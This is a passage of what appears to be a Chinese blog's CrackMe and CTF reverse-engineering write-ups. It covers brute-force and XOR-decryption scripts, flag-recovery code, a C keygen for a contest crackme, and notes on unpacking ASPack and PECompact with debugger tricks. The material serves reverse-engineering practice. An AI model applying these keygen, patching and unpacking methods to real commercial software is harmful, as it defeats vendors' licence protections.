class="number">57</span> &amp;&amp; a[<span class="number">3</span>] &lt; <span class="number">65</span>))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>((a[<span class="number">0</span>] &gt; <span class="number">90</span> &amp;&amp; a[<span class="number">0</span>] &lt; <span class="number">97</span>) || (a[<span class="number">1</span>] &gt; <span class="number">90</span> &amp;&amp; a[<span class="number">1</span>] &lt; <span class="number">97</span>) ||</span><br><span class="line">(a[<span class="number">2</span>] &gt; <span class="number">90</span> &amp;&amp; a[<span class="number">2</span>] &lt; <span class="number">97</span>) || (a[<span class="number">3</span>] &gt; <span class="number">90</span> &amp;&amp; a[<span class="number">3</span>] &lt; <span class="number">97</span>))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(a[<span class="number">0</span>] &gt; <span class="number">122</span> || a[<span class="number">1</span>] &gt; <span class="number">122</span> || a[<span class="number">2</span>] &gt; <span class="number">122</span> || a[<span class="number">3</span>] &gt; <span class="number">122</span>)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="built_in">memcpy</span>(decode_data, ida_chars, <span class="number">0xAB0</span>); </span><br><span class="line">decode_code(decode_data, <span class="number">0xAB0</span>, i);</span><br><span class="line"><span class="keyword">if</span>(sub_401550(<span class="number">0</span>, decode_data, <span class="number">0xAB0</span>) == <span class="number">0xAFFE390F</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%X\n"</span>, i);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c%c%c%c\n"</span>, a[<span class="number">0</span>], a[<span class="number">1</span>], a[<span class="number">2</span>], a[<span class="number">3</span>]);</span><br><span class="line"><span class="built_in">end</span> = clock();</span><br><span class="line">total = (<span class="built_in">end</span>-start)/CLOCKS_PER_SEC;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"爆破所用时间：%d分:%d秒\n"</span>, total/<span class="number">60</span>, total%<span class="number">60</span>);</span><br><span class="line"><span class="keyword">break</span>; </span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还挺快就得到了答案，主要是要优化去除不可能的字符。<img src="/2020/07/31/CrackMe/image-20200813135150617.png" alt="image-20200813135150617"></p><p>以为到这里应该就结束了，解密出的代码就是一个简单的对key与name判断，算法会很简单。是我想多了🤣，说起这个算法我就是痛，花了好多时间动调猜测一些函数的作用，伪代码实在不好看，也不想看了，汇编就不说了。。</p><p><strong>开始进入解密部分</strong></p><p>写ida-python脚本对<strong>00402010</strong>开始的代码解密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">addr = <span class="number">0x402010</span></span><br><span class="line">s = [<span class="number">89</span>, <span class="number">63</span>, <span class="number">-85</span>, <span class="number">-97</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0xab0</span>):</span><br><span class="line">    PatchByte(addr+i, (Byte(addr+i)^s[i&amp;<span class="number">3</span>])&amp;<span class="number">0xff</span>)</span><br></pre></td></tr></table></figure><p>来到解密后的函数：<img src="/2020/07/31/CrackMe/image-20200813141328038.png" alt="image-20200813141328038"></p><p>由于最后要name计算出的整数与key计算出的整数相等，而name计算出的整数在OD的内存中十六进制存放，这是可以看到的。而key计算出数据时也是依次得到数据的每一位，然后*16转化一个整数。所以我们只要让key计算出的每一位与name计算后的数据的每一位相等即可。且16进制数只有“0123456789ABCDEF”这些数字，所以可以先得到一张这样的映射表。</p><p>模拟sub_4021A0与sub_402A40函数得到表：<strong>这里我对sub_402A40进行了简化，因为只有0-F的数字，所以只有这几个小正数情况。</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++)</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">0xff</span>; i++)</span><br><span class="line"><span class="keyword">if</span>(((i^<span class="number">0x86</span>)<span class="number">-48</span>) == j)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(j == <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"&#123;%#X"</span>, i);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">", %#X"</span>, i);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"&#125;"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/07/31/CrackMe/image-20200813144333400.png" alt="image-20200813144333400"></p><p>最后我以计算name为Bxb的key，事先得到了Bxb计算出的数据：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> s[] = <span class="string">"1D702A7304A94"</span>;</span><br><span class="line"><span class="keyword">int</span> a[] = &#123;<span class="number">0XB6</span>, <span class="number">0XB7</span>, <span class="number">0XB4</span>, <span class="number">0XB5</span>, <span class="number">0XB2</span>, <span class="number">0XB3</span>, <span class="number">0XB0</span>,</span><br><span class="line">   <span class="number">0XB1</span>, <span class="number">0XBE</span>, <span class="number">0XBF</span>, <span class="number">0XBC</span>, <span class="number">0XBD</span>, <span class="number">0XBA</span>, <span class="number">0XBB</span>, <span class="number">0XB8</span>, <span class="number">0XB9</span>&#125;; </span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>] = <span class="string">"BEEF"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; s[i]; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> temp = s[i];</span><br><span class="line"><span class="keyword">if</span>(temp &gt;= <span class="number">48</span> &amp;&amp; temp &lt;= <span class="number">57</span>)</span><br><span class="line">temp -= <span class="number">48</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">temp -= <span class="number">55</span>;</span><br><span class="line"><span class="built_in">sprintf</span>(flag+i*<span class="number">2</span>+<span class="number">4</span>, <span class="string">"%X"</span>, a[temp]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">puts</span>(flag);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/07/31/CrackMe/image-20200813144918630.png" alt="image-20200813144918630"></p><p>做到这，真的不想再看这个题了，我就想不通，伪代码怎么如此绕，key的生成算法都动调了好多遍。所以那个name计算的算法也真的不想看了。。。进而不能得到注册机。</p><p>其次这个题，对要改变数据的内存地址，传参都是使用ecx传参指向this*。</p><h2 id="乘风破浪"><a href="#乘风破浪" class="headerlink" title="乘风破浪"></a>乘风破浪</h2><p>——题目来自看雪题库</p><p>题目难点：题目开始启动双线程，线程之间以事件通讯。对于不清楚双线程，自然会有很多疑问，跟踪程序起来也会困难一些。</p><p>首先以不知道双线程的角度来跟踪程序：</p><p>查看程序中的获取控件文本内容的API，搜索发现没有GetDlgItemText，但是有GetWindowTextLenthW与GetWindowTextW。双击进入。<img src="/2020/07/31/CrackMe/image-20200731174647264.png" alt="image-20200731174647264"></p><p>由于后面肯定会对输入数据进行验证处理，所以在数据窗口对该地址下硬件访问断点, F9运行断下后：<img src="/2020/07/31/CrackMe/image-20200731175348583.png" alt="image-20200731175348583"></p><p>上面汇编代码很简单，就是比较输入的name与key是否相等且最后以这个来确定返回值，尝试打开程序看验证一下，不对的。继续跟着程序返回：既然上一个验证函数是错误的，下面这个箭头所指跳转就不能实现才正确。<img src="/2020/07/31/CrackMe/image-20200731175649160.png" alt="image-20200731175649160"></p><p>修改标志寄存器后，单步分析401299以下的代码，很多无用的跳转，还是简单，一个验证：name与key的逆序是否相等且长度要不小于8。再次打开程序验证一下，正确。所以程序的key只要是name的逆序就正确。</p><p>当然我对程序还是有很多疑问，从出题人的帖子看到说是双线程。</p><p>开始去学习多线程的知识，觉得讲的很清楚的一个帖子：<a href="https://blog.csdn.net/LL596214569/article/details/89163734" target="_blank" rel="noopener">https://blog.csdn.net/LL596214569/article/details/89163734</a></p><p>了解多线程后，理解这个程序就很好了，首先是看是否有创建事件，查找API：CreatEvent。在创建线程API：CreatThread下断点，从CreatThread找到线程函数的地址。接着就是下图中的函数：<img src="/2020/07/31/CrackMe/image-20200731182155636.png" alt="image-20200731182155636"></p><p><strong>最后</strong>，所以程序的整体逻辑就是首先创建2个事件，再创建2个线程，2个线程函数都有WaitForSingleObject函数一直等待事件的信号后再向下继续执行。而我们输入name与key后点击Ok就会发生按钮事件，触发OS向程序发现消息，然后执行SetEvent函数将指定线程的WaitForSingleObject函数等待的指定事件设置为有信号状态。<img src="/2020/07/31/CrackMe/image-20200731183904491.png" alt="image-20200731183904491"></p><p>接下来在该线程进行验证name与key，如果验证通过的话设置另外一个线程等待的指定的事件设置为有信号状态，另一个线程开始执行显示提示正确的对话框的代码。<strong>简而言之：一个线程负责验证，一个线程负责显示。</strong></p><h2 id="渐入佳境"><a href="#渐入佳境" class="headerlink" title="渐入佳境"></a>渐入佳境</h2><p>——题目来自看雪题库</p><p>运行一下程序，有错误输入提示框。</p><p>上手直接找MessageBox，到达代码处向上分析：所以我们要向上回溯找到对ebp+c赋值处。<img src="/2020/07/31/CrackMe/image-20200801132230026.png" alt="image-20200801132230026"></p><p>继续向上回溯可以看到：<img src="/2020/07/31/CrackMe/image-20200801132543497.png" alt="image-20200801132543497"></p><p>所以下面跳转的地方就是验证过程：算法很简单。<img src="/2020/07/31/CrackMe/image-20200801132628646.png" alt="image-20200801132628646"></p><h2 id="CrackMe01"><a href="#CrackMe01" class="headerlink" title="CrackMe01"></a>CrackMe01</h2><p>——题目来自“百度杯”CTF比赛十一月场</p><p>还是上手载入OD，找一下获取输入文本相关的API：<img src="/2020/07/31/CrackMe/image-20200805164512873.png" alt="image-20200805164512873"></p><p>开始只看到第一个，下断后在程序输入内容后却没有断下。还以为又是多线程，分析一波后确实创建了一个线程，但不对。后面才在第二个GetWindowTextW下断，输入内容后程序断下。</p><p>单步跟踪后发现，将输入的字符传到另外一个内存空间存储后，再调用PostMessageW函数将输入字符传给指定句柄的窗口。这里打开ida看下：<img src="/2020/07/31/CrackMe/image-20200805170315887.png" alt="image-20200805170315887"></p><p>之后可以直接查找默认消息处理函数：DefWindowProc 来定位处理输入字符的代码处。</p><p>这里看PostMessage函数第一个参数的交叉引用来定位目的代码。因为hWnd是接收消息的窗口句柄，我们看个窗口的句柄赋值给了hWnd。hWnd是全局变量。</p><p>从交叉引用来到下面的函数：<img src="/2020/07/31/CrackMe/image-20200805172125636.png" alt="image-20200805172125636"></p><p>可以看到，使用了WinClass定义了一个窗口的类，对每个属性赋值后使用RegisterClassW来注册窗口，最后通过CreatWindowExW将该窗口实例化，并此窗口句柄赋值给Hwnd。所以我们输入的字符串是发送给了这个窗口。</p><p>另外，WndClass中的成员lpfnWndProc指向一个回调函数，是窗体的消息处理函数。<strong>它接受到PostMessageW发送来的消息后即调用。</strong></p><p>进入该窗口消息处理函数：<img src="/2020/07/31/CrackMe/image-20200805172955592.png" alt="image-20200805172955592"></p><p>从上面函数知道，虽然不知道输入的具体字符串是什么，但是可以爆破出累加和，且不大于17*122 = 2074（因为输入字符长度&lt;= 17）。得到累加和我们就能知道，窗口显示出的是什么内容了。</p><p>写程序收工：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, k = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida_chars[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0xF0</span>, <span class="number">0x04</span>, <span class="number">0xDA</span>, <span class="number">0x04</span>, <span class="number">0xD7</span>, <span class="number">0x04</span>, <span class="number">0xD1</span>, <span class="number">0x04</span>, <span class="number">0x8C</span>, <span class="number">0x04</span>, </span><br><span class="line">  <span class="number">0xFF</span>, <span class="number">0x04</span>, <span class="number">0xF5</span>, <span class="number">0x04</span>, <span class="number">0xFE</span>, <span class="number">0x04</span>, <span class="number">0xE3</span>, <span class="number">0x04</span>, <span class="number">0xF8</span>, <span class="number">0x04</span>, </span><br><span class="line">  <span class="number">0xE7</span>, <span class="number">0x04</span>, <span class="number">0xFF</span>, <span class="number">0x04</span>, <span class="number">0xE3</span>, <span class="number">0x04</span>, <span class="number">0xE9</span>, <span class="number">0x04</span>, <span class="number">0xF0</span>, <span class="number">0x04</span>, </span><br><span class="line">  <span class="number">0xF3</span>, <span class="number">0x04</span>, <span class="number">0x85</span>, <span class="number">0x04</span>, <span class="number">0x80</span>, <span class="number">0x04</span>, <span class="number">0x84</span>, <span class="number">0x04</span>, <span class="number">0xF2</span>, <span class="number">0x04</span>, </span><br><span class="line">  <span class="number">0xF4</span>, <span class="number">0x04</span>, <span class="number">0xF3</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">2074</span>; i++)</span><br><span class="line"><span class="keyword">if</span>(((i&amp;<span class="number">0xf00</span>) == <span class="number">1024</span>) &amp;&amp; ((i&amp;<span class="number">0xf0</span>) == <span class="number">0xb0</span>) &amp;&amp; ((i&amp;<span class="number">6</span>) == <span class="number">6</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">44</span>; j += <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">flag[k++] = *(<span class="keyword">short</span> <span class="keyword">int</span> *)&amp;ida_chars[j]^i; </span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">puts</span>(flag), k = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">strcpy</span>(flag, <span class="string">""</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终得到：即第一个满足。<img src="/2020/07/31/CrackMe/image-20200805173523092.png" alt="image-20200805173523092"></p><h2 id="dame"><a href="#dame" class="headerlink" title="dame"></a>dame</h2><p>——题目来自DAMN’s Official joining Contest（是一个机构的加入测试，将程序指定破解并写出注册机）</p><p>题目链接：<a href="https://pan.baidu.com/s/1y0pznGu6qEb1gut2M0tXog" target="_blank" rel="noopener">https://pan.baidu.com/s/1y0pznGu6qEb1gut2M0tXog</a> 提取码：h0z9</p><p>要求：大按钮和标题显示未锁定的消息并且程序说按钮被按下时未锁定与注册机的编写。<img src="/2020/07/31/CrackMe/image-20200806181244476.png" alt="image-20200806181244476"></p><p>载入OD发现有壳，直接堆栈平衡原理把壳带走，然后dump出无壳文件。</p><p>由于我们要修改对话框模块上的内容，所以首先找到创建对话框函数。OD载入在程序入口点即可看到：DialogBoxParamA<img src="/2020/07/31/CrackMe/image-20200806181904819.png" alt="image-20200806181904819"></p><p>可以看到上图中的对话框过程函数的起始地址：<strong>401045</strong>，该处代码好像没有识别出来，且下断有提示并且执行很奇怪。载入ida中看看：<img src="/2020/07/31/CrackMe/image-20200806182148079.png" alt="image-20200806182148079"></p><p>所以enter在OD中没有识别出来，且401035-401045确实数据，401049才是代码开始，所以返回OD进行处理，注意不能nop，因为数据在后面有使用到，直接下断401049。</p><p>接下来，不断单步调试知道，DialogProc函数根据不同的消息做出相应的响应。首先创建整个对话框模板，然后不断载入各种控件。<img src="/2020/07/31/CrackMe/image-20200806182822916.png" alt="image-20200806182822916"></p><p>OD调试后，在IDA中看指定代码段：可以看到dword_402313处的值决定了控件的显示内容和样式。<img src="/2020/07/31/CrackMe/image-20200806183539623.png" alt="image-20200806183539623"></p><p>找到dword_402313赋值处：是对程序部分的代码的校验，检测是否下断点。<img src="/2020/07/31/CrackMe/image-20200806183725134.png" alt="image-20200806183725134"></p><p>虽然知道了dowrd_402313处的值影响对话框的显示，但是什么样的值才能达到我们的目的呢，回到OD动调。<img src="/2020/07/31/CrackMe/image-20200806185407720.png" alt="image-20200806185407720"></p><p>由于程序中存在代码校验，多次调试发现，当下断后[402313] = 1，为下断点[402313] = 0。 继续调试：<img src="/2020/07/31/CrackMe/image-20200806185813389.png" alt="image-20200806185813389"></p><p>到这里就清楚了，[402313]的值还决定了显示字符串的偏移位置，当[402313] = 1时，字符串为：DAMN’s TryMe -CRACKED! 而它后面一个字符串就是：UNLOCKED！所以推出：[402313]的值要等于2。</p><p>重新载入，找到合适位置在内存窗口修改[402313]的值为2，然后运行。<img src="/2020/07/31/CrackMe/image-20200806190419665.png" alt="image-20200806190419665"></p><p>对话框弹出的内容仍然不是UNLOCKED！ida中OD都可以找到MessageBoxA看一下。这里使用OD：<img src="/2020/07/31/CrackMe/image-20200806190848568.png" alt="image-20200806190848568"></p><p>从上面看到，[402308]的值会决定对不对[402313]的值修改，所以对[402308]的值修改：成功。最后要让程序之后也可以这样运行，简单的patch一下即可。</p><p>下面开始找注册算法，疑惑的是Register按钮为什么不能点击？难道还要对程序打补丁什么的，不熟悉Win32编程脑子还是一片空白。</p><p>但是机缘巧合下，让我找到了这里面的玄机。在OD中找到获取我们输入字符串的函数后，条件反射下了断。随便点击了下程序的输入文本框，程序突然在OD中断了下来。。且看到下面的一个<strong>EnableWindow</strong>函数，百度下功能：设置窗口的可用性，即我们程序的Resiter按钮是否可用。<img src="/2020/07/31/CrackMe/image-20200806193140672.png" alt="image-20200806193140672"></p><p>多次测试，发现第一个GetDlgItemTextA是获取name字符串，第二个获取key。且每输入一个name字符就调用一次第一个GetDlgItemTextA函数将该字符存入指定的内存区域，返回字符长度；每输入一个key就调用第二个GetDlgItemTextA函数将其存入指定内存区域，返回字符长度，并调用<strong>004012F3</strong>函数（应该是name与key的验证过程），最后通过<strong>004012F3</strong>函数的返回值来执行<strong>EnableWindow</strong>函数，以此决定<strong>Register</strong>按钮的按钮是否可用。</p><p>输入数据，下断004012F3并进入：<img src="/2020/07/31/CrackMe/image-20200806233948875.png" alt="image-20200806233948875"></p><p>到此，结束对程序的分析。最后将每个十六进制数转化为对应的字符的汇编指令还要多看看：<code>sbb al, 69；das；</code>。这里al = 0xE，sbb带借位减法后：al = al-0x69-CF = 0xAE。</p><blockquote><p>das：组合(压缩)BCD码的加法调整指令。<strong>功能：如果AL低四位&gt;9或AF=1 ，则AL的值减06h，并置AF=1；如果AL高四位&gt;9或CF=1 ，则AL的值减60h ,且置CF=1；</strong></p></blockquote><p>所以这里：al = al-0x60 = 0x45。<strong>而0x45就是’E’字符的ASCII。</strong></p><p>最后C语言简单写个注册机程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> name[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> ans = <span class="number">0x44414D4E</span>, i = <span class="number">0</span>, temp = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"name："</span>);</span><br><span class="line">gets(name);</span><br><span class="line"><span class="keyword">while</span>(name[i])</span><br><span class="line">&#123;</span><br><span class="line">temp += name[i];</span><br><span class="line">ans = ((ans &gt;&gt; <span class="number">1</span>) | ((ans&amp;<span class="number">1</span>) &lt;&lt; <span class="number">31</span>));</span><br><span class="line">ans = ((ans &gt;&gt; i) | ((ans&amp;((<span class="keyword">int</span>)(<span class="built_in">pow</span>(<span class="number">2</span>, i)<span class="number">-1</span>))) &lt;&lt; <span class="number">32</span>-i));</span><br><span class="line">ans ^= temp;</span><br><span class="line">i++;</span><br><span class="line">&#125;</span><br><span class="line">ans |= <span class="number">0x10101010</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%X"</span>, ans);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="跃跃欲试"><a href="#跃跃欲试" class="headerlink" title="跃跃欲试"></a>跃跃欲试</h2><p>——题目来自看雪题库</p><p>题目加了Aspack壳，直接OD中堆栈平衡原理脱壳。</p><p>找到获取用户输入信息的API，来到验证过程：首先是下断点的4个函数对email_address验证。<img src="/2020/07/31/CrackMe/image-20200810111355447.png" alt="image-20200810111355447"></p><p>动态很多次，始终没调出这几个函数的功能且代码逻辑也奇怪。。。</p><p>题目的要求只要后面serial，或许serial与email_address与serial没有关系，干脆直接跳过email_addree设置新的EIP，来到验证serial处：<img src="/2020/07/31/CrackMe/image-20200810111950081.png" alt="image-20200810111950081"></p><p>果然，serial与email_address没有关系，serial的验证也只是简单的加减法。就是整理起来有点麻烦。</p><p>最后载入IDA看看伪代码呢。原来是C标准库里查找子字符串的函数。<img src="/2020/07/31/CrackMe/image-20200810112350707.png" alt="image-20200810112350707"></p><h2 id="一知半解"><a href="#一知半解" class="headerlink" title="一知半解"></a>一知半解</h2><p>——题目来自看雪题库</p><p>从这个CM认识了一个新壳：PEcompact</p><p>载入OD仍然使用堆栈平衡原理脱壳，但对这个壳好像不适用。。。认为自己找到了OEP，dump后发现打不开。</p><p>来到看雪论坛找师傅们脱这个壳的方法，先是使用了<a href="https://bbs.pediy.com/user-24467.htm" target="_blank" rel="noopener">CCDebuger</a>大师傅的脱壳脚本，真的是强，算是脱壳机了。脱壳后发现和我找到的OEP是一样，那我的应该是没有修复输入表导致打不开。</p><p>后面又看到了一位师傅脱这个壳的帖子，里面这样说道：</p><blockquote><p><strong>外壳完整地保留了输入表，外壳加载时没有对IAT加密；外壳解压数据时，完整的输入表会在内存中出现，然后外壳用显示加载DLL的方式获得各个函数的地址，并将该地址填充到IAT中。</strong></p></blockquote><p>所以我回到OD换了第二个dump的方式：<img src="/2020/07/31/CrackMe/image-20200811111903851.png" alt="image-20200811111903851"></p><p>哈哈，还没有用importRec就能成功打开，只不过这个也看情况。</p><p>另外记录一下用esp定律脱这个壳不一样的地方：首先下硬件访问断点。<img src="/2020/07/31/CrackMe/image-20200811112234416.png" alt="image-20200811112234416"></p><p>F9后，断在程序的领空：可以看到并不是从堆栈pop出下断的数据断下的，所以继续F9。<img src="/2020/07/31/CrackMe/image-20200811112818716.png" alt="image-20200811112818716"></p><p>后面遇到同上处理，直到看到对堆栈访问。不久看到来到OEP标志。<img src="/2020/07/31/CrackMe/image-20200811113028787.png" alt="image-20200811113028787"></p><p>最后，程序的逆向很简单。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本帖主要对练习Crackme的知识点与突破点进行记录。&lt;/p&gt;
    
    </summary>
    
    
      <category term="CrackMe" scheme="https://www.Bxnop.cn/categories/CrackMe/"/>
    
    
      <category term="破解" scheme="https://www.Bxnop.cn/tags/%E7%A0%B4%E8%A7%A3/"/>
    
  </entry>
  
  <entry>
    <title>杂合writeup</title>
    <link href="https://www.bxnop.cn/2020/07/29/%E6%9D%82%E5%90%88writeup/"/>
    <id>https://www.bxnop.cn/2020/07/29/%E6%9D%82%E5%90%88writeup/</id>
    <published>2020-07-29T08:25:14.000Z</published>
    <updated>2020-09-12T09:34:32.323Z</updated>
    
    <content type="html"><![CDATA[<p>平时一些零散的CTF题的记录。<a id="more"></a></p><h2 id="little-fish-re"><a href="#little-fish-re" class="headerlink" title="little fish (re)"></a>little fish (re)</h2><blockquote><p>链接：<a href="https://pan.baidu.com/s/1Wpl5KjFQf33hgQpE29YuKQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1Wpl5KjFQf33hgQpE29YuKQ</a><br>提取码：slh8<br>复制这段内容后打开百度网盘手机App，操作更方便哦</p></blockquote><p>程序打不开，提示缺少libstdc++-6.dll，做完google半天找这个库下载，但都是32位的。。想验证flag都不行。。</p><p>ida中main函数伪代码，很简单：<img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20200817163536555.png" alt="image-20200817163536555"></p><p>加密函数整体：里面还涉及2个表，且加密有点绕。感觉是什么加密。。但不清楚。。<img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20200817164301185.png" alt="image-20200817164301185"></p><p>之后从百度了其中的一个表中部分数据，从一篇文章中找到加密算法：</p><p><img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20200817164720071.png" alt="image-20200817164720071"></p><p>其实题目文件有提示，但对于不知道这个加密算法来说就是没有提示。。。</p><p>然后找blowfish加密算法文章学习。<a href="https://www.cnblogs.com/my_life/articles/5845940.html" target="_blank" rel="noopener">讲的好清楚</a></p><p>再次回到ida中看题目中的加密算法，对比下，这次当然是清楚好多，也确定了就是正常的blowfish加密。</p><p>先是写找到网上的blowfish加密算法，使用C语言写来模拟了下，然后解密：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 